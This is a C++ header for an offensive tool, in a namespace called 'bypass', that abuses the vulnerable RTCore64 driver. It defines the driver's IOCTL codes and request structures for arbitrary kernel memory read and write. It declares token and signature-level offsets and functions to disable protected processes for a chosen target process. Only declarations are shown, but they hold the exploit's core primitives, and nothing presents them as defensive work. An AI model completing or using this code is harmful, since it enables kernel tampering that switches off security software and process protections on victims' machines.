#pragma once
#include <Windows.h>
#include <string>
#include <vector>

namespace bypass {
    struct RTCORE64_MSR_READ {
        DWORD Register;
        DWORD ValueHigh;
        DWORD ValueLow;
    };

    struct RTCORE64_MEMORY_READ {
        BYTE Pad0[8];
        DWORD64 Address;
        BYTE Pad1[8];
        DWORD ReadSize;
        DWORD Value;
        BYTE Pad3[16];
    };

    struct RTCORE64_MEMORY_WRITE {
        BYTE Pad0[8];
        DWORD64 Address;
        BYTE Pad1[8];
        DWORD ReadSize;
        DWORD Value;
        BYTE Pad3[16];
    };

    struct Offsets {
        DWORD64 UniqueProcessIdOffset;
        DWORD64 ActiveProcessLinksOffset;
        DWORD64 TokenOffset;
        DWORD64 SignatureLevelOffset;
    };

    // IOCTL codes
    constexpr DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
    constexpr DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
    constexpr DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

    DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address);
    void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value);

    WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address);
    DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address);
    DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address);
    void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value);

    void Log(const char* Message, ...);
    unsigned long long getKernelBaseAddr();
    std::vector<int> processPIDsByName(const std::wstring& name);
    Offsets getVersionOffsets();
    void disableProtectedProcesses(DWORD targetPID, Offsets offsets);

    void EnabledBypass(const std::wstring& processName);
}
